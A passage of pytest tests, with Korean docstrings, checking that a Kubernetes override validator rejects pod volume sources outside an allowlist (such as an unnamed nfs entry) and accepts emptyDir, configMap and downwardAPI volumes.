        pytest.param({"emptyDir": {}, "nfs": {"server": "x", "path": "/"}}, id="unnamed"),
    ],
)
@pytest.mark.parametrize("template_key, locked", TEMPLATES)
def test_advanced_edit_takes_only_the_allowed_volume_sources(template_key, locked, volume):
    """볼륨 종류는 거부 목록으로 다 셀 수 없어 허용 목록(`ADDED_VOLUME_SOURCES`)으로 본다. 렌더가
    만든 볼륨에 다른 종류를 얹거나 이름 없는 원소로 넣어도 걸린다."""
    with pytest.raises(MergeError) as e:
        check_overrides({"spec": {template_key: {"spec": {"volumes": [volume]}}}}, locked=locked)
    assert e.value.code == "locked_field"
    assert e.value.path[-1] in volume and e.value.path[-1] not in ADDED_VOLUME_SOURCES


@pytest.mark.parametrize("template_key, locked", TEMPLATES)
def test_allowed_volume_sources_and_edits_to_rendered_volumes_pass(template_key, locked):
    """허용 종류는 그대로 지나가고, 렌더가 만든 emptyDir 의 크기를 바꾸는 것도 된다."""
    volumes = [
        {"name": "tmp", "emptyDir": {"sizeLimit": "1Gi"}},
        {"name": "conf", "configMap": {"name": "team-a-conf"}},
        {"name": "meta", "downwardAPI": {"items": []}},
    ]
    check_overrides({"spec": {template_key: {"spec": {"volumes": volumes}}}}, locked=locked)
